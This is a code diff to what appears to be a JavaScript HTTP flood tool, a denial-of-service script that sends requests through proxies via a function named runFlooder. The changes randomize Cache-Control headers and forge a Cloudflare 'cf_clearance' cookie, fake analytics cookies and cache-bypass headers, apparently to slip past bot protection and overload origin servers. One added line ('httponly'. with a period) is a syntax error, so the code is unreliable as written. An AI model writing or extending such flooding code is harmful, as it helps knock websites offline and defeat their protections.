@@ -134,7 +134,33 @@ editedline();
   'deflate'
  ];
 
- const control_header = ["no-cache", "max-age=0"];
+ const control_header = [
+  "max-age=604800",
+  "proxy-revalidate",
+  "public, max-age=0",
+  "max-age=315360000",
+  "public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800",
+  "s-maxage=604800",
+  "max-stale",
+  "public, immutable, max-age=31536000",
+  "must-revalidate",
+  "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0",
+  "max-age=31536000,public,immutable",
+  "max-age=31536000,public",
+  "min-fresh",
+  "private",
+  "public",
+  "s-maxage",
+  "no-cache",
+  "no-cache, no-transform",
+  "max-age=2592000",
+  "no-store",
+  "no-transform",
+  "max-age=31557600",
+  "stale-if-error",
+  "only-if-cached",
+  "max-age=0"
+  ];
 
  const refers = [
      "https://www.google.com/",
@@ -187,6 +213,7 @@ editedline();
     'cross-site',
 	'same-origin',
 	'same-site',
+	'httponly'.
 	'none'
   ];
 
@@ -316,8 +343,13 @@ const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)
  headers["sec-fetch-dest"] = "document";
  headers["sec-fetch-site"] = "same-origin";
  headers["TE"] = "trailers";
+ headers["set-cookie"] = randomHeaders['set-cookie'];
+ headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15)
+ headers["cache-control"] = control;
+ headers["cf-cache-status"] = "BYPASS, DYNAMIC";
  headers["sec-fetch-user"] = "?1";
  headers["x-requested-with"] = "XMLHttpRequest";
+ headers["X-Frame-Options"] = "SAMEORIGIN, SAMEORIGIN";
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
